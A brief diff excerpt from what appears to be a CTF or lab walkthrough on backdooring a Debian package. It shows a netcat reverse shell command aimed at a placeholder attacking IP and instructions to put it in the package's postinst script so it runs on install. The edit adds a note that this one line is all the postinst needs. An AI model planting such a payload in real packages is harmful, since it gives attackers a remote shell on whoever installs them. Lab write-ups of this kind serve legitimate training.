@@ -434,7 +434,8 @@ pub/jfrost/backdoor/
 nc -e /bin/sh ATTACKING-IP 4444
 ~~~
 
-- Step 8: Build the deb package with the above payload in the "postinst"
+- Step 8: Build the deb package with the above payload in the "postinst". *Note: that one payload line is ALL you need in the postinst file; nothing else!"*
+
 	- "dpkg -x [debfile] work"
 	- "mkdir work/DEBIAN"
  	- "cd DEBIAN"
